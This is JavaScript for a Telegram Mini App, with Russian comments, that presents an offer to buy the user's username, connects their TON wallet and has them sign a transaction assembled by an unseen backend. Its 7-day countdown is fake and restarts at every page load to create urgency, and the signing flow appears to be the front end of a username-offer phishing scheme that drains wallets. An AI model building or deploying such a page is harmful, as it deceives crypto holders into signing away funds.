const tg = window.Telegram.WebApp;
tg.expand();

// Получаем ID оффера из URL (передается ботом)
const urlParams = new URLSearchParams(window.location.search);
const offerId = urlParams.get('offer_id') || urlParams.get('startapp');

// Инициализация TonConnect
const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: window.location.origin + '/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

if (!offerId) {
    document.getElementById('accept-btn').innerText = "Invalid link";
} else {
    // Загружаем данные оффера с бэкенда
    fetch(`/api/offer/${offerId}`)
        .then(r => r.json())
        .then(data => {
            if (data.error) throw new Error(data.error);
            
            document.getElementById('display-username').innerText = data.username;
            document.getElementById('display-price').innerText = data.price;
            document.getElementById('info-username').innerText = data.username;
            document.getElementById('info-web').innerText = data.username;
            document.getElementById('info-ton').innerText = data.username;
            
            document.getElementById('accept-btn').innerText = "Accept the offer";
            document.getElementById('accept-btn').disabled = false;
        })
        .catch(e => {
            document.getElementById('accept-btn').innerText = "Offer not found";
        });
}

// --- Живой таймер (7 дней) ---
let endTime = Date.now() + 7 * 24 * 60 * 60 * 1000;
setInterval(() => {
    let diff = endTime - Date.now();
    if (diff < 0) diff = 0;
    
    const days = Math.floor(diff / (1000 * 60 * 60 * 24));
    const hours = Math.floor((diff / (1000 * 60 * 60)) % 24).toString().padStart(2, '0');
    const mins = Math.floor((diff / 1000 / 60) % 60).toString().padStart(2, '0');
    const secs = Math.floor((diff / 1000) % 60).toString().padStart(2, '0');

    // Обновляем дни
    document.getElementById('t-days').innerText = `${days} days`;
    
    // Разбиваем часы на 2 цифры
    document.getElementById('t-h0').innerText = hours[0];
    document.getElementById('t-h1').innerText = hours[1];
    
    // Разбиваем минуты на 2 цифры
    document.getElementById('t-m0').innerText = mins[0];
    document.getElementById('t-m1').innerText = mins[1];
    
    // Разбиваем секунды на 2 цифры
    document.getElementById('t-s0').innerText = secs[0];
    document.getElementById('t-s1').innerText = secs[1];
}, 1000);

// --- Обработка кнопки "Accept" ---
document.getElementById('accept-btn').addEventListener('click', async () => {
    if (!tonConnectUI.connected) {
        await tonConnectUI.openModal();
        return;
    }

    const address = tonConnectUI.wallet.account.address;
    const btn = document.getElementById('accept-btn');
    btn.innerText = "Checking...";
    btn.disabled = true;

    try {
        // Отправляем адрес на бэкенд для проверки и сборки транзакции
        const res = await fetch('/api/build', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address, offer_id: offerId })
        });
        
        const data = await res.json();
        
        if (!res.ok) {
            tg.showAlert(data.error || "Error creating transaction");
            btn.innerText = "Accept the offer";
            btn.disabled = false;
            return;
        }

        // Вызываем кошелек для подписи
        await tonConnectUI.sendTransaction(data);
        
        // Логируем успех на бэкенде (опционально)
        await fetch('/api/signed', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ offer_id: offerId, address }) 
        });

        tg.showAlert("Success! Offer accepted.");
        btn.innerText = "Success";
        
    } catch (e) {
        console.error(e);
        tg.showAlert("Error: " + e.message);
        btn.innerText = "Accept the offer";
        btn.disabled = false;
    }
});
